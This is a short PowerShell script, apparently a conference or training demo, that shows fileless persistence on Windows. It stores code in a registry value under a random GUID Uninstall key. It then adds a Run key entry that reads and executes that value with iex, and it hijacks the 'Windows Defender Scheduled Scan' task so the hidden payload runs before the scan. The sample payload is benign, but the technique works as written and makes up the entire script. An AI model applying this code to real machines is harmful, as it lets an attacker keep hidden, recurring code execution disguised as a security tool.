# Break if accidentally executed fully
break

# Setup ISE
$psISE.Options.Zoom = 160

# Generate GUID and associated registry path
$GUID = [guid]::NewGuid().Guid
$RegPath = Join-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\' -ChildPath $Guid

# Create Registry Entry
New-Item -Path $RegPath -Force
$RegPayload = @{
    Path = $RegPath 
    Name = 'Path'
    PropertyType = 'String'
    Value = '"Awesome!";Start-Sleep 15'
}
New-ItemProperty @RegPayload

# Set payload to Run
$RegRunPath = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
$RegTrigger = @{
    Path = $RegRunPath
    Name = 'Test'
    PropertyType = 'String'
    Value = "PowerShell -nop -c ""& {iex (gpv $RegPath Path)}"""
    Force = $true
}
New-ItemProperty @RegTrigger

# Show Run Registry key
C:\SysinternalsSuite\regjump.exe HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Logoff to display the result of this action

# Manipulate existing task
$Action1 = (Get-ScheduledTask -TaskName 'Windows Defender Scheduled Scan').Actions[-1]
$Action2 = New-ScheduledTaskAction -Execute "powershell" -Argument "-nop -c ""& {iex (gpv $RegPath Path)}"""
$ScheduledTask = @{
     TaskName = 'Windows Defender Scheduled Scan'
     TaskPath = '\Microsoft\Windows\Windows Defender\'
     Action = $Action2,$Action1
}
Set-ScheduledTask @ScheduledTask

# Start scheduled task from task scheduler

